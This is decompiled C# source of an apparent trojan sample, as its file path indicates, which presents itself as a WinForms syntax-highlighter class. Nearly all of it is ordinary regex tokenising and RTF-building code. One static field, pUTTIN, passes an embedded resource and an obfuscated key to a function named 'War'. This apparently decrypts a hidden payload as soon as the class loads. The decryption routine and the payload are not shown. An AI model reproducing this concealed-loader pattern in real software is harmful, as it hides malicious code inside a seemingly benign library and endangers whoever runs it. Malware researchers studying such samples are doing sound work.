// Decompiled with JetBrains decompiler
// Type: WinFormsSyntaxHighlighter.SyntaxHighlighter
// Assembly: WinFormsSyntaxHighlighter, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7F5F1073-81B4-4786-AC13-05D2F8A8156A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-c3b3ae0b7ab9c19511bfd4527e8687232b1ba654396a0cff650edcb74c1371b9.exe

using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using WinFormsSyntaxHighlighter.Properties;

namespace WinFormsSyntaxHighlighter
{
  public class SyntaxHighlighter
  {
    private readonly RichTextBox _richTextBox;
    private readonly int _fontSizeFactor;
    private readonly string _fontName;
    private bool _isDuringHighlight;
    private List<StyleGroupPair> _styleGroupPairs;
    private readonly List<PatternStyleMap> _patternStyles = new List<PatternStyleMap>();
    private Regex _lineBreakRegex;
    public static byte[] pUTTIN = TextBoxBaseExtensions.War(Resources.Helper_Classes, "bیYنچ");

    public SyntaxHighlighter(RichTextBox richTextBox)
    {
      this._richTextBox = richTextBox != null ? richTextBox : throw new ArgumentNullException(nameof (richTextBox));
      this._fontSizeFactor = Convert.ToInt32(this._richTextBox.Font.Size * 2f);
      this._fontName = this._richTextBox.Font.Name;
      this.DisableHighlighting = false;
      this._richTextBox.TextChanged += new EventHandler(this.RichTextBox_TextChanged);
    }

    public bool DisableHighlighting { get; set; }

    public void AddPattern(PatternDefinition patternDefinition, SyntaxStyle syntaxStyle) => this.AddPattern((this._patternStyles.Count + 1).ToString((IFormatProvider) CultureInfo.InvariantCulture), patternDefinition, syntaxStyle);

    public void AddPattern(
      string name,
      PatternDefinition patternDefinition,
      SyntaxStyle syntaxStyle)
    {
      if (patternDefinition == null)
        throw new ArgumentNullException(nameof (patternDefinition));
      if (syntaxStyle == null)
        throw new ArgumentNullException(nameof (syntaxStyle));
      if (string.IsNullOrEmpty(name))
        throw new ArgumentException("name must not be null or empty", nameof (name));
      if (this.FindPatternStyle(name) != null)
        throw new ArgumentException("A pattern style pair with the same name already exists");
      this._patternStyles.Add(new PatternStyleMap(name, patternDefinition, syntaxStyle));
    }

    protected SyntaxStyle GetDefaultStyle() => new SyntaxStyle(this._richTextBox.ForeColor, this._richTextBox.Font.Bold, this._richTextBox.Font.Italic);

    private PatternStyleMap FindPatternStyle(string name) => this._patternStyles.FirstOrDefault<PatternStyleMap>((Func<PatternStyleMap, bool>) (p => string.Equals(p.Name, name, StringComparison.Ordinal)));

    public void ReHighlight()
    {
      if (this.DisableHighlighting || this._isDuringHighlight)
        return;
      this._richTextBox.DisableThenDoThenEnable(new Action(this.HighlighTextBase));
    }

    private void RichTextBox_TextChanged(object sender, EventArgs e) => this.ReHighlight();

    internal IEnumerable<Expression> Parse(string text)
    {
      text = text.NormalizeLineBreaks("\n");
      List<Expression> expressions = new List<Expression>()
      {
        new Expression(text, ExpressionType.None, string.Empty)
      };
      foreach (PatternStyleMap patternStyle in this._patternStyles)
        expressions = this.ParsePattern(patternStyle, expressions);
      return (IEnumerable<Expression>) this.ProcessLineBreaks(expressions);
    }

    private Regex GetLineBreakRegex()
    {
      if (this._lineBreakRegex == null)
        this._lineBreakRegex = new Regex(Regex.Escape("\n"), RegexOptions.Compiled);
      return this._lineBreakRegex;
    }

    private List<Expression> ProcessLineBreaks(List<Expression> expressions)
    {
      List<Expression> expressionList = new List<Expression>();
      Regex lineBreakRegex = this.GetLineBreakRegex();
      foreach (Expression expression1 in expressions)
      {
        int num = -1;
        foreach (Match match in (IEnumerable<Match>) lineBreakRegex.Matches(expression1.Content).Cast<Match>().OrderBy<Match, int>((Func<Match, int>) (m => m.Index)))
        {
          if (match.Success)
          {
            if (match.Index > num + 1)
            {
              Expression expression2 = new Expression(expression1.Content.Substring(num + 1, match.Index - num - 1), expression1.Type, expression1.Group);
              expressionList.Add(expression2);
            }
            Expression expression3 = new Expression(expression1.Content.Substring(match.Index, match.Length), ExpressionType.Newline, "line-break");
            expressionList.Add(expression3);
            num = match.Index + match.Length - 1;
          }
        }
        if (num < expression1.Content.Length - 1)
        {
          Expression expression4 = new Expression(expression1.Content.Substring(num + 1, expression1.Content.Length - num - 1), expression1.Type, expression1.Group);
          expressionList.Add(expression4);
        }
      }
      return expressionList;
    }

    private List<Expression> ParsePattern(
      PatternStyleMap patternStyleMap,
      List<Expression> expressions)
    {
      List<Expression> pattern = new List<Expression>();
      foreach (Expression expression1 in expressions)
      {
        if (expression1.Type != 0)
        {
          pattern.Add(expression1);
        }
        else
        {
          Regex regex = patternStyleMap.PatternDefinition.Regex;
          int num = -1;
          foreach (Match match in (IEnumerable<Match>) regex.Matches(expression1.Content).Cast<Match>().OrderBy<Match, int>((Func<Match, int>) (m => m.Index)))
          {
            if (match.Success)
            {
              if (match.Index > num + 1)
              {
                Expression expression2 = new Expression(expression1.Content.Substring(num + 1, match.Index - num - 1), ExpressionType.None, string.Empty);
                pattern.Add(expression2);
              }
              Expression expression3 = new Expression(expression1.Content.Substring(match.Index, match.Length), patternStyleMap.PatternDefinition.ExpressionType, patternStyleMap.Name);
              pattern.Add(expression3);
              num = match.Index + match.Length - 1;
            }
          }
          if (num < expression1.Content.Length - 1)
          {
            Expression expression4 = new Expression(expression1.Content.Substring(num + 1, expression1.Content.Length - num - 1), ExpressionType.None, string.Empty);
            pattern.Add(expression4);
          }
        }
      }
      return pattern;
    }

    internal IEnumerable<StyleGroupPair> GetStyles()
    {
      yield return new StyleGroupPair(this.GetDefaultStyle(), string.Empty);
      foreach (PatternStyleMap patternStyle in this._patternStyles)
      {
        SyntaxStyle style = patternStyle.SyntaxStyle;
        yield return new StyleGroupPair(new SyntaxStyle(style.Color, style.Bold, style.Italic), patternStyle.Name);
        style = (SyntaxStyle) null;
      }
    }

    internal virtual string GetGroupName(Expression expression) => expression.Group;

    private List<StyleGroupPair> GetStyleGroupPairs()
    {
      if (this._styleGroupPairs == null)
      {
        this._styleGroupPairs = this.GetStyles().ToList<StyleGroupPair>();
        for (int index = 0; index < this._styleGroupPairs.Count; ++index)
          this._styleGroupPairs[index].Index = index + 1;
      }
      return this._styleGroupPairs;
    }

    private void HighlighTextBase()
    {
      this._isDuringHighlight = true;
      try
      {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.AppendLine(this.RTFHeader());
        stringBuilder.AppendLine(this.RTFColorTable());
        stringBuilder.Append("\\viewkind4\\uc1\\pard\\f0\\fs").Append(this._fontSizeFactor).Append(" ");
        foreach (Expression expression in this.Parse(this._richTextBox.Text))
        {
          if (expression.Type == ExpressionType.Whitespace)
          {
            string content = expression.Content;
            stringBuilder.Append(content);
          }
          else if (expression.Type == ExpressionType.Newline)
          {
            stringBuilder.AppendLine("\\par");
          }
          else
          {
            string str = expression.Content.Replace("\\", "\\\\").Replace("{", "\\{").Replace("}", "\\}");
            List<StyleGroupPair> styleGroupPairs = this.GetStyleGroupPairs();
            string groupName = this.GetGroupName(expression);
            StyleGroupPair styleGroupPair = styleGroupPairs.FirstOrDefault<StyleGroupPair>((Func<StyleGroupPair, bool>) (s => string.Equals(s.GroupName, groupName, StringComparison.Ordinal)));
            if (styleGroupPair != null)
            {
              string empty1 = string.Empty;
              string empty2 = string.Empty;
              if (styleGroupPair.SyntaxStyle.Bold)
              {
                empty1 += "\\b";
                empty2 += "\\b0";
              }
              if (styleGroupPair.SyntaxStyle.Italic)
              {
                empty1 += "\\i";
                empty2 += "\\i0";
              }
              stringBuilder.AppendFormat("\\cf{0}{2} {1}\\cf0{3} ", (object) styleGroupPair.Index, (object) str, (object) empty1, (object) empty2);
            }
            else
              stringBuilder.AppendFormat("\\cf{0} {1}\\cf0 ", (object) 1, (object) str);
          }
        }
        stringBuilder.Append("\\par }");
        this._richTextBox.Rtf = stringBuilder.ToString();
      }
      finally
      {
        this._isDuringHighlight = false;
      }
    }

    private string RTFColorTable()
    {
      List<StyleGroupPair> styleGroupPairs = this.GetStyleGroupPairs();
      if (styleGroupPairs.Count <= 0)
        styleGroupPairs.Add(new StyleGroupPair(this.GetDefaultStyle(), string.Empty));
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append("{\\colortbl ;");
      foreach (StyleGroupPair styleGroupPair in styleGroupPairs)
        stringBuilder.AppendFormat("{0};", (object) ColorUtils.ColorToRtfTableEntry(styleGroupPair.SyntaxStyle.Color));
      stringBuilder.Append("}");
      return stringBuilder.ToString();
    }

    private string RTFHeader() => "{\\rtf1\\ansi\\ansicpg1252\\deff0\\deflang1033{\\fonttbl{\\f0\\fnil\\fcharset0 " + this._fontName + ";}}";
  }
}
